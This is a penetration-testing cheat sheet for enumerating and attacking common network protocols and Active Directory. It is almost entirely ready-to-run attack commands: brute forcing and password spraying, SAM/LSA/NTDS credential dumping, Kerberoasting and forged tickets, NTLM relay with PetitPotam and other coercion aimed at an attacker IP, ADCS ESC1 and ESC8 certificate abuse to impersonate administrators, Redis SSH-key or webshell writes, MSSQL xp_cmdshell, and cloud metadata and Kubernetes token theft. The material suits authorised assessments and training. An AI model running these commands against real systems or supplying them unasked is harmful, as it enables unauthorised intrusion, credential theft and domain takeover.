# Network Protocols and Services Cheat Sheet

A field reference for enumerating and abusing the common network protocols
seen on internal assessments: web, FTP, SMTP/POP/IMAP, SSH, SMB, SNMP, LDAP,
Kerberos, NetBIOS/RPC, databases, remote admin, and the relay/MITM attacks
that glue them together. Includes modern 2024-2026 tooling: NetExec
(CrackMapExec successor), Certipy ESC1-ESC17, Coercer, BloodHound CE,
mitm6 with Kerberos relay, and cloud protocol abuse. Commands assume Kali
unless noted.

---

## 1. HTTP / HTTPS (80, 443, 8080, 8443)

### Manual HTTP with telnet/nc

```
nc <ip> 80
GET /path HTTP/1.1
Host: <vhost>
User-Agent: x
<blank line>
```

HTTPS via openssl:

```
openssl s_client -quiet -connect <ip>:443
HEAD / HTTP/1.0
```

### Banner, headers, vhost discovery

```
curl -ski http://<ip>/ | head -20
curl -ski https://<ip> -resolve <vhost>:443:<ip>
nikto -h http://<ip> -o nikto.txt
whatweb http://<ip>
wpscan --url http://<ip> --enumerate u,p,t
feroxbuster -u http://<ip> -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,asp,aspx,jsp,html
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt -x php,bak,old
ffuf -u http://<ip>/FUZZ -w seclists/Discovery/Web-Content/raft.txt -mc 200,301,401,403
```

### TLS inspection

```
testssl.sh --severity HIGH --html <host>
sslscan <host>
nmap --script ssl-cert,ssl-enum-ciphers,ssl-poodle,ssl-heartbleed -p 443 <ip>
```

### Web app privesc tie-ins

Look for: default creds on admin panels, exposed `.git`, `.env`, `web.config`,
backup files, LFI/RFI, SSRF to internal services and cloud metadata, command
injection in admin pages, deserialisation stacks (Java/.NET). See the web
pentesting cheatsheets for the deeper rabbit holes.

---

## 2. FTP (21)

```
ftp <ip>
nc <ip> 21
USER <user>
PASS <pass>
```

Common commands over telnet:

```
STAT                # extended info
SYST                # system type
TYPE A               # ASCII mode
TYPE I               # binary mode
PASV                 # passive mode
LIST
RETR <file>
STOR <file>
```

### Enumeration

```
nmap -p 21 --script ftp-* -sV <ip>
nmap -p 21 --script ftp-anon,ftp-brute,ftp-vuln-cve2010-4220,ftp-syst <ip>
```

Anonymous FTP:

```
ftp <ip>             # user: anonymous, pass: anything
# Look for config files, backups, .bash_history, id_rsa
```

Common FTP daemons to version match: vsftpd (smile backdoor 2.3.4), ProFTPD
(modcopy 1.3.5 RCE), Pure-FTPd, uFTP.

### Brute force

```
hydra -L users.txt -P pass.txt ftp://<ip>
medusa -h <ip> -U users.txt -P pass.txt -M ftp
```

---

## 3. SSH (22)

```
ssh <user>@<ip>
ssh -v <ip>                          # see auth methods
ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no <user>@<ip>
```

Enumeration:

```
nmap -p 22 -sV --script ssh2-enum-algos,ssh-auth-methods,ssh-hostkey --script-args ssh_hostkey=full <ip>
ssh-audit <ip>                        # https://github.com/jtesta/ssh-audit
```

User enumeration on OpenSSH < 7.7:

```
python ssh_user_enum.py --userList users.txt <ip>
msfconsole > use auxiliary/scanner/ssh/ssh_enumusers
```

LibSSH unauthorized access (libssh < 0.7.6 / 0.8.4):

```
python 46307.py <ip> 22 id
```

Brute force:

```
hydra -l <user> -P /usr/share/wordlists/rockyou.txt -e s ssh://<ip>
medusa -h <ip> -u <user> -P rockyou.txt -M ssh
ncrack -p 22 --user <user> -P rockyou.txt <ip>
patator ssh_login host=<ip> user=<user> password=FILE0 0=rockyou.txt
```

### SSH key reuse and known_hosts

```
ssh-keyscan -t rsa,ecdsa,ed25519 <ip> >> known_hosts
# Reuse a stolen private key across hosts in known_hosts
ssh -i id_rsa <user>@<other-host>
```

---

## 4. Telnet (23)

```
telnet <ip>
nc -nv <ip> 23
```

Brute force:

```
patator telnet_login host=<ip> inputs='FILE0\nFILE1' 0=users.txt 1=pass.txt \
  persistent=0 prompt_re='Username: | Password:'
hydra -L users.txt -P pass.txt telnet://<ip>
```

Telnet often exposes router/switch management. Capture creds with Responder
or ettercap when telnet runs in cleartext on a shared segment.

---

## 5. SMTP, POP3, IMAP (25, 110, 143 / 587, 993, 995)

### SMTP (25 / 587)

```
nc <ip> 25
HELO foo
EHLO foo
VRFY <user>
EXPN <list>
MAIL FROM:<sender>
RCPT TO:<recipient>
DATA
subject: test
test body
.
QUIT
```

User enum:

```
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <ip>
nmap -p 25 --script smtp-enum-users,smtp-commands,smtp-vuln-cve2011-1720,smtp-open-relay <ip>
swaks --to victim --from attacker --server <ip> --body "test"
```

Open relay test:

```
swaks --to outside@external.com --from attacker@yourdomain --server <ip>
msfconsole > use auxiliary/scanner/smtp/smtp_relay
```

### POP3 (110 / 995)

```
telnet <ip> 110
USER <user>
PASS <pass>
STAT
LIST
RETR <num>
DELE <num>
QUIT
```

### IMAP (143 / 993)

```
nc <ip> 143
a1 LOGIN <user> <pass>
a1 LIST "" "*"
a1 SELECT "INBOX"
a1 FETCH 1 BODY[]
a1 LOGOUT
```

IMAP supports server-side search and sync, POP3 is download only. Brute
force all three with `hydra -L users -P pass pop3://<ip>`, `imap://<ip>`,
`smtp://<ip>`.

### Email protocol abuse via Responder (2024-2026 updates)

Responder now captures across the full email protocol stack with STARTTLS
support: SMTP (25/587), IMAP (143) with STARTTLS, IMAPS (993) native SSL,
POP3 (110). Trigger by poisoning DNS MX/A records via DHCPv6 so mail
clients connect to your rogue server.

---

## 6. SCP, SFTP (22)

```
# Copy from remote to local
scp <user>@<ip>:/path/file.gz ~
# Copy from local to remote
scp file.gz <user>@<ip>:/path/to/save/
# Recursive
scp -r dir <user>@<ip>:/tmp/
# SFTP interactive
sftp <user>@<ip>
  ls
  get <file>
  put <file>
```

---

## 7. DNS (53)

```
dig <domain> @<ip>
dig axfr <domain> @<ns>
dig +multi AXFR @ns1.example.com example.com
dnsrecon -t axfr -d <domain>
fierce -dns <domain>
dnsenum <domain>
nmap -p 53 --script dns-zone-transfer,dns-brute,dns-nsid <ip>
```

Subdomain brute:

```
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
amass enum -d <domain>
subfinder -d <domain>
```

DNS rebinding and cache poisoning are out of scope for this cheatsheet but
worth knowing for internal DNS servers.

---

## 8. SNMP (161, 162 / UDP)

```
snmpwalk -c public -v1 <ip> 1
snmpwalk -c private -v1 <ip>
snmp-check <ip> -c public
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <ip>
nmap -sU -p 161 --script snmp-brute,snmp-netstat,snmp-processes,snmp-interfaces,snmp-sysdescr,snmp-win32-services,snmp-win32-shares,snmp-win32-software,snmp-win32-users <ip>
```

Community string brute:

```
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/seclists/Misc/wordlists-common-snmp-community-strings.txt <ip>
onesixtyone -c community.txt -i hosts.txt
hydra -P community.txt snmp://<ip>
```

SNMP RW (write) lets you modify process tables, set values, or trigger
config pushes on some devices (Cisco, printers).

MSF auxiliary modules: `scanner/snmp/snmp_enum`, `snmp_login`,
`cisco_config_tftp`, `snmp_enum_hp_laserjet`.

---

## 9. SMB (139, 445)

### Enumeration with NetExec (CrackMapExec successor)

NetExec is the active fork of CrackMapExec with 6700+ commits, RDP/VNC/
SSH/FTP support, and regular community PRs. CME is abandoned.

```
nxc smb <ip>/24 -u '' -p '' --shares
nxc smb <ip>/24 -u 'guest' -p '' --shares
nxc smb <ip> -u <user> -p <pass> --shares
nxc smb <ip> -u <user> -H <ntlm> --local-auth
nxc smb <ip>/24 -u <user> -p <pass> --rid-brute
nxc smb <ip> -u <user> -p <pass> --sam                  # dump SAM if local admin
nxc smb <ip> -u <user> -p <pass> --lsa
nxc smb <ip> -u <user> -p <pass> --ntds                 # on a DC
nxc smb <ip>/24 -u <user> -p <pass> --exec-cmd "whoami"
nxc smb <ip> -u <user> -p <pass> --kerberoasting
```

### Classic enumeration

```
enum4linux -a <ip>
enum4linux-ng -A -C <ip>
smbclient -L //<ip> -N
smbmap -H <ip>
nbtscan <ip>/24
nmblookup -A <ip>
nmap -p 139,445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-protocols,smb2-security-mode,smb2-capabilities <ip>
rpcclient -U "" -N <ip>
  srvinfo
  enumdomusers
  enumdomgroups
  getdompwinfo
  netshareenumall
  querydominfo
```

Null session and shares:

```
smbclient //<ip>/IPC$ -N
smbclient //<ip>/share -U <user>
smbmap -H <ip> -u <user> -p <pass> -R
mount -t cifs -o username=<user>,password=<pass> //<ip>/share /mnt
```

Vuln scripts:

```
nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-cve2009-3103,smb-vuln-conficker,smb-vuln-regsvc-dos <ip>
```

Brute force:

```
hydra -L users.txt -P pass.txt smb://<ip>
medusa -h <ip> -U users.txt -P pass.txt -M smbnt
nxc smb <ip> -u users.txt -p pass.txt --continue-on-success
```

### Impacket

```
impacket-smbclient <domain>/<user>:<pass>@<ip>
impacket-smbexec  <domain>/<user>:<pass>@<ip>
impacket-psexec   <domain>/<user>:<pass>@<ip>
impacket-wmiexec  <domain>/<user>:<pass>@<ip>
impacket-secretsdump <domain>/<user>:<pass>@<ip>
```

Check SMB signing (needed for relay):

```
nxc smb <ip>/24 --gen-relay-list targets.txt
nmap -p 445 --script smb-security-mode <ip>
```

---

## 10. RPC and NetBIOS (135, 139)

```
rpcinfo -p <ip>
rpcclient -U "" -N <ip>
impacket-rpcdump <ip>
nmap -p 135 --script msrpc-enum <ip>
```

MSF DCERPC scanners:

```
auxiliary/scanner/dcerpc/endpoint_mapper
auxiliary/scanner/dcerpc/hidden
auxiliary/scanner/dcerpc/management
auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
```

Named pipes useful for coercion: `spoolss` (PrinterBug), `netlogon`
(PetitPotam), `samr`, `lsarpc`, `efsrpc`, `atsvc`, `svcctl`, `browser`,
`winreg`.

---

## 11. LDAP (389, 636 / 3268, 3269 GC)

```
ldapsearch -x -H ldap://<ip> -b "dc=domain,dc=local"
ldapsearch -x -H ldap://<ip> -s base '(objectclass=*)'
ldapsearch -LLL -x -H ldap:// -b '' -s base 'objectclass=*'
windapsearch.py --dc-ip <ip> --users --full > users.txt
ldapdomaindump -u <domain>\<user> -p <pass> <ip>
nmap -p 389,636 --script ldap-rootdse,ldap-search,ldap-bind,ldap-brute <ip>
```

Anonymous enumeration:

```
ldapsearch -x -H ldap://<ip> -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName memberOf
ldapsearch -x -H ldap://<ip> -b "dc=domain,dc=local" "(objectClass=computer)" cn operatingSystem
ldapsearch -x -H ldap://<ip> -b "dc=domain,dc=local" "(objectClass=group)" member
```

Look for:

```
grep -iE 'password|description|scriptPath|userPassword|unixHomeDirectory' ldap.txt
jq -r '.[].attributes | select(.adminCount==[1]) | .sAMAccountName[]' domain_users.json
```

ADCS template enum:

```
ldapsearch -x -H ldap://<dc> -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local"
certipy find -u user@domain.local -p 'pass' -dc-ip <ip> -vulnerable
Certify.exe find /vulnerable
```

---

## 12. Kerberos (88)

```
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='DOMAIN.LOCAL' <ip>
kerbrute -d domain.local --dc <ip> userenum users.txt
kerbrute -d domain.local --dc <ip> bruteuser users.txt pass.txt
```

AS-REP roasting:

```
impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -format hashcat
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
# Rubeus preauthscan for accounts not requiring pre-auth (2024+):
Rubeus.exe preauthscan /users:users.txt /domain:corp.local
```

Kerberoasting:

```
impacket-GetUserSPNs <domain>/<user>:<pass> -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt
# Rubeus with opsec (AES, LDAPs):
Rubeus.exe kerberoast /rc4opsec /ldaps /outfile:hashes.txt
```

Overpass the hash / pass the key:

```
impacket-getTGT <domain>/<user> -hashes :<ntlm>
impacket-psexec -k -no-pass <domain>/<user>@<host>
Rubeus.exe asktgt /user:<user> /rc4:<ntlm> /ptt /opsec
```

Diamond tickets (2024+, forge TGT from a legit TGT without krbtgt key):

```
Rubeus.exe diamond /user:user /password:pass /krbkey:KEY /ticketuser:administrator /groups:512
```

Kerberos brute / spray (no 4625 events, only 4768/4771):

```
kerbrute passwordspray -d domain.local --dc <ip> users.txt 'Fall2025!'
Rubeus.exe brute /passwords:pass.txt /users:users.txt /domain:corp.local
```

---

## 13. NTLM relay and coercion

### Responder for hash capture (2024-2026 updates)

Responder is an LLMNR/NBT-NS/MDNS/DHCPv6 poisoner with 17+ rogue auth
servers. 2024-2026 additions: DHCPv6 INFORMATION-REQUEST, domain
filtering, SMTP/IMAP STARTTLS, IMAPS (993), Kerberos AS-REQ capture
(hashcat -m 7500), RDP NLA hash capture, WinRM rogue server, DCERPC
capture, DNS SVCB/HTTPS/SRV/MX/SOA/EDNS0, SQLite database, macOS
launcher.

```
sudo responder -I eth0 -rdP                 # full attack mode
sudo responder -I eth0 -A                   # analyze only, no spoofing
sudo responder -I eth0 --dhcpv6 -v          # DHCPv6 attack
sudo responder -I eth0 -Pvd                 # WPAD + rogue DHCP
# Disable SMB and HTTP in responder.cfg when running ntlmrelayx
```

Crack hashes:

```
hashcat -m 5600 ntlm.txt rockyou.txt        # NetNTLMv2
hashcat -m 7500 asreq.txt rockyou.txt       # Kerberos AS-REQ
john --wordlist=rockyou.txt ntlm.txt
```

### ntlmrelayx (Impacket)

```
# Relay to SMB (need SMB signing disabled on target)
nxc smb <ip>/24 --gen-relay-list targets.txt
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -socks           # socks proxy mode
# Use relayed sessions via proxychains
proxychains impacket-secretsdump <domain>/<user>:<pass>@<ip>
```

Relay to LDAP / LDAPS / ADCS:

```
impacket-ntlmrelayx -t ldap://<dc> -smb2support --escalate-user <user>
impacket-ntlmrelayx -6 -wh fakewpad -t ldaps://<dc> -l loot
impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# Certipy relay:
certipy relay -t http://<ca>/certsrv/certfnsh.asp -smb2support
```

### Coercion tools (force a host/DC to authenticate to you)

Coercer (https://github.com/p0dalirius/Coercer) bundles 12+ RPC methods:

```
coercer coerce -t target -u user -p pass -d domain -l attacker_ip
coercer scan -t target --filter-protocol-name MS-EFSR
coercer fuzz --targets-file hosts.txt -l attacker_ip
```

Individual tools:

```
# PetitPotam (MS-EFSR) - use ly4k fork, original repo is gone
python3 petitpotam.py <attacker-ip> <dc-ip>
python3 petitpotam.py -method AddUsersToFile target '\\attacker\share'
# PrinterBug (MS-RPRN)
python3 printerbug.py <domain>/<user>:<pass>@<target> <attacker-ip>
# DFSCoerce (MS-DFSNM)
python3 dfscoerce.py -u <user> -p <pass> <attacker-ip> <target>
# ShadowCoerce (MS-FSRVP)
python3 shadowcoerce.py -d domain -u user -p password LISTENER TARGET
# CheeseOunce (MS-EVEN) - newer, now in Coercer
```

### IPv6 DNS takeover (mitm6)

mitm6 wins because Windows prefers IPv6 and trusts DHCPv6 advertisements.
The victim's WPAD lookup goes to your relay. RA guard does not equal DHCPv6
guard.

```
sudo mitm6 -d domain.local
# In another terminal, relay to LDAPS
sudo impacket-ntlmrelayx -6 -t ldaps://<dc-ip> -wh fakewpad.domain.local -l loot
# Kerberos relay variant (2024+):
sudo mitm6 -d domain.local --relay dc01.domain.local
```

---

## 14. ADCS (Active Directory Certificate Services)

Certipy v5.0.3 now supports ESC1-ESC17 as of 2026. ADCS is the number one
AD attack surface in modern environments.

### Enumeration

```
certipy find -u user@domain.local -p 'pass' -dc-ip <ip> -vulnerable
Certify.exe find /vulnerable
Certify.exe cas
```

### ESC1 - Template misconfiguration

Conditions: ENROLLEE_SUPPLIES_SUBJECT enabled, Client Authentication or
Smart Card Logon EKU, enrollment rights for low-privileged users.

```
certipy req -u user@domain.local -p 'pass' -dc-ip <ip> \
  -target CA.domain.local -ca 'domain-CA' \
  -template 'VulnerableTemplate' -upn administrator@domain.local
certipy auth -pfx administrator.pfx -dc-ip <ip>
```

### ESC4 - Vulnerable template ACLs

```
certipy template -u user@domain.local -p 'pass' -template 'VulnTemplate' -save-old
certipy req -u user@domain.local -p 'pass' -template 'VulnTemplate' -upn administrator@domain.local
```

### ESC8 - NTLM Relay to ADCS

```
impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
python3 petitpotam.py <attacker-ip> <dc-ip>        # coerce auth
certipy auth -pfx dc.pfx -dc-ip <ip>
```

### ESC15 (CVE-2024-49019) - Arbitrary Application Policy Injection ("EKUwu")

Affects unpatched CAs (pre-Nov 2024). Schema V1 templates with
CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT allow injection of arbitrary Application
Policies.

```
certipy req -u user -p pass -ca 'CA' -template 'VulnV1' -application-policies <OIDs>
```

### ESC16 - Security Extension Disabled on CA

CA globally configured to NOT include szOID_NTDS_CA_SECURITY_EXT SID
extension. Behaves as if ALL templates are ESC9. Exploitable when
StrongCertificateBindingEnforcement=0/1 (compatibility mode, default until
Feb 2025, full enforcement Sept 2025). Combined with ESC6, works even
under full enforcement (mode 2).

### Shadow Credentials

```
certipy shadow auto -u user@domain.local -p 'pass' -account 'target$'
certipy auth -pfx target.pfx -dc-ip <ip>
# Whisker (C#):
Whisker.exe add /target:targetuser
# pyWhisker:
python3 pywhisker.py -d domain.local -u user -p pass --target 'targetuser' --action 'add'
```

### UnPAC the Hash

```
certipy auth -pfx user.pfx -dc-ip <ip> -ldap-shell
Rubeus.exe asktgt /user:user /certificate:user.pfx /getcredentials
```

### KrbRelayUp

```
KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount -ComputerName YOURPC$ -ComputerPassword Password123
KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount -ComputerName YOURPC$ -ComputerPassword Password123 -Method ADCS -CAEndpoint CA.domain.local
```

---

## 15. Databases

### MSSQL (1433)

```
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-dump-hashes -sV <ip>
sqsh -S <ip> -U sa -P '<pass>'
  xp_cmdshell 'whoami'
  go
  EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
  EXEC sp_execute_external_script @language=N'Python', @script=N'import os;os.system("whoami")';
```

MSF: `scanner/mssql/mssql_ping`, `mssql_login`, `admin/mssql/mssql_exec`.

### MySQL (3306)

```
mysql -h <ip> -u root -p
nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-databases,mysql-variables,mysql-vuln-cve2012-2122 <ip>
# UDF privesc on 4.x/5.0
```

### PostgreSQL (5432)

```
psql -h <ip> -U postgres -W
# Defaults: postgres:postgres, postgres:password, admin:admin
nmap -p 5432 --script pgsql-brute,pgsql-empty-password <ip>
# RCE as superuser: COPY cmd, language plpythonu, lo_import to read files
```

### Oracle (1521)

```
tnscmd10g version -h <ip>
nmap -p 1521 --script oracle-tns-version,oracle-sid-brute,oracle-brute <ip>
odat all -s <ip> -p 1521
```

### MongoDB (27017)

```
mongo --host <ip> --quiet --eval 'db.getSiblingDB("admin").system.users.find()'
nmap -p 27017 --script mongodb-info,mongodb-databases <ip>
```

### Redis (6379)

```
redis-cli -h <ip>
  CONFIG GET *
  CONFIG SET dir /var/lib/redis
  CONFIG SET dbfilename root
  SET x "\n\n ssh-rsa AAAA...\n\n"
  SAVE
# Or write a cron/webshell
```

---

## 16. Remote admin

### RDP (3389)

```
nmap -p 3389 --script rdp-vuln-ms12-020,rdp-enum-encryption,rdp-ntlm-info <ip>
rdesktop -u <user> -p <pass> <ip>
xfreerdp /u:<user> /p:<pass> /v:<ip> /dynamic-resolution +clipboard /drive:share,/share
ncrack -vv --user <user> -P pass.txt rdp://<ip>
crowbar -b rdp -s <ip>/32 -u <user> -C rockyou.txt
hydra -L users.txt -P pass.txt rdp://<ip>
```

### WinRM (5985 HTTP, 5986 HTTPS)

```
evil-winrm -i <ip> -u <user> -p '<pass>'
evil-winrm -i <ip> -u <user> -H '<ntlm>'
nmap -p 5985 --script http-title,http-headers <ip>
nxc winrm <ip> -u <user> -p '<pass>' -x "whoami"
```

### VNC (5900)

```
nmap -p 5900 --script vnc-info,vnc-brute,vnc-title <ip>
vncviewer <ip>
hydra -P pass.txt vnc://<ip>
```

### SSH / SCP / SFTP (22), see sections 3 and 6.

---

## 17. NFS (2049)

```
showmount -e <ip>
mount -o nolock <ip>:/share /mnt
nmap -p 111,2049 --script nfs-ls,nfs-showmount,nfs-rootkit -sV <ip>
```

If `no_root_squash`, see the Linux privesc cheat sheet for the SUID shell
trick.

---

## 18. Generic brute force

Hydra supports most protocols with a consistent flag set:

```
hydra -l <username> -P <wordlist> <server> <service-type>
# Extras: -s <port>, -V (verbose), -t <threads>, -d (debug), -f (stop on first),
#         -e s (try user as pass), -e n (try empty pass), -e nsr combined
```

Examples:

```
hydra -L users.txt -P pass.txt -e nsr -t 8 -f -s 22 ssh://<ip>
hydra -L users.txt -P pass.txt -f -s 80 http-get /<path>
hydra -L users.txt -P pass.txt -f http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid"
hydra -l admin -P pass.txt -s 5985 http-get://<ip>/wsman
```

Other brute tools: `medusa`, `ncrack`, `patator` (highly customisable),
`NetExec` for SMB/WinRM/MSSQL with `--continue-on-success`.

### Password spraying (avoid lockouts)

```
# One password against many users, one attempt per interval
nxc smb <ip>/24 -u users.txt -p 'Fall2025!' --continue-on-success
kerbrute passwordspray -d domain.local --dc <ip> users.txt 'Fall2025!'
# Rubeus:
Rubeus.exe brute /passwords:pass.txt /users:users.txt /domain:corp.local
```

---

## 19. Cloud metadata and modern extras

```
# AWS IMDSv1 (no auth)
curl -s http://169.254.169.254/latest/meta-data/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# AWS IMDSv2 (requires token)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# GCP
curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
curl -s -H 'Metadata: true' "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

Kubernetes service account from inside a pod:

```
cat /var/run/secrets/kubernetes.io/serviceaccount/token
curl -k -H "Authorization: Bearer $(cat .../token)" https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

---

## 20. Quick reference table

| Port | Service | First commands |
|------|---------|----------------|
| 21 | FTP | `nmap --script ftp-*`, anonymous login, `hydra ftp://` |
| 22 | SSH | `ssh-audit`, `nmap --script ssh-*`, `hydra ssh://` |
| 23 | Telnet | `nc -nv <ip> 23`, `hydra telnet://` |
| 25 | SMTP | `smtp-user-enum`, `swaks`, `nmap --script smtp-*` |
| 53 | DNS | `dig axfr`, `dnsrecon`, `fierce`, `subfinder` |
| 88 | Kerberos | `kerbrute`, `GetNPUsers`, `GetUserSPNs`, `Rubeus` |
| 110/143/993/995 | POP/IMAP | `nc <ip> 110`, `hydra pop3://` / `imap://` |
| 135 | MSRPC | `rpcdump`, `rpcclient`, `nmap --script msrpc-enum`, `Coercer` |
| 139/445 | SMB | `enum4linux`, `smbclient`, `NetExec`, `impacket-*` |
| 161 | SNMP | `snmpwalk`, `onesixtyone`, `snmp-check` |
| 389/636 | LDAP | `ldapsearch`, `windapsearch`, `ldapdomaindump`, `certipy` |
| 1433 | MSSQL | `sqsh`, `odat`, `nmap --script ms-sql-*` |
| 3306 | MySQL | `mysql`, UDF privesc |
| 3389 | RDP | `xfreerdp`, `nmap --script rdp-*`, `ncrack rdp://` |
| 5432 | Postgres | `psql`, `nmap --script pgsql-*` |
| 5985 | WinRM | `evil-winrm`, `NetExec winrm` |
| 6379 | Redis | `redis-cli`, write cron/webshell/SSH key |
| 27017 | MongoDB | `mongo`, `nmap --script mongodb-*` |

---

## 21. 2024-2026 trend summary

| Trend | Detail |
|-------|--------|
| ADCS is the #1 AD attack surface | ESC1-ESC17 (Certipy leads research). PetitPotam to relay to cert chain still dominant. |
| Coercion methods multiplying | Coercer bundles 12+ methods (PrinterBug, PetitPotam, ShadowCoerce, DFSCoerce, CheeseOunce). |
| IPv6 is default-on attack vector | mitm6 + Responder DHCPv6 bypass Windows 10/11 defaults. RA guard does not equal DHCPv6 guard. |
| BloodHound split | Legacy v4 deprecated. CE (v6, Go+React+Postgres+Neo4j) is the future. OpenGraph extends beyond AD. |
| NetExec replaces CME | CME abandoned. NetExec is the active fork with RDP/VNC/SSH/FTP and 6700+ commits. |
| Kerberos modernization | Rubeus diamond tickets, DMSA (Win2025 BadSuccessor), PKINIT, KDC proxy, preauthscan. |
| Email protocols weaponized | Responder now STARTTLS-capable across SMTP/IMAP/IMAPS. |
| Kerberos brute still kerbrute | No 2024-2026 successor. kerbrute and Rubeus brute remain standard. |

---

## 22. References

- HackTricks Pentesting Network: <https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network>
- PayloadsAllTheThings Methodology: <https://github.com/swisskyrepo/PayloadsAllTheThings>
- Impacket (Fortra): <https://github.com/fortra/impacket>
- NetExec: <https://github.com/Pennyw0rth/NetExec>
- Responder: <https://github.com/lgandx/Responder>
- mitm6: <https://github.com/dirkjanm/mitm6>
- Coercer: <https://github.com/p0dalirius/Coercer>
- PetitPotam (ly4k): <https://github.com/ly4k/PetitPotam>
- Certipy: <https://github.com/ly4k/Certipy>
- Certify: <https://github.com/GhostPack/Certify>
- Rubeus: <https://github.com/GhostPack/Rubeus>
- BloodHound CE: <https://github.com/SpecterOps/BloodHound>
- SharpHound: <https://github.com/SpecterOps/SharpHound>
- BloodHound.py: <https://github.com/dirkjanm/BloodHound.py>
- kerbrute: <https://github.com/ropnop/kerbrute>
- SecLists: <https://github.com/danielmiessler/SecLists>
- 0daysecurity port enumeration: <http://0daysecurity.com/penetration-testing/enumeration.html>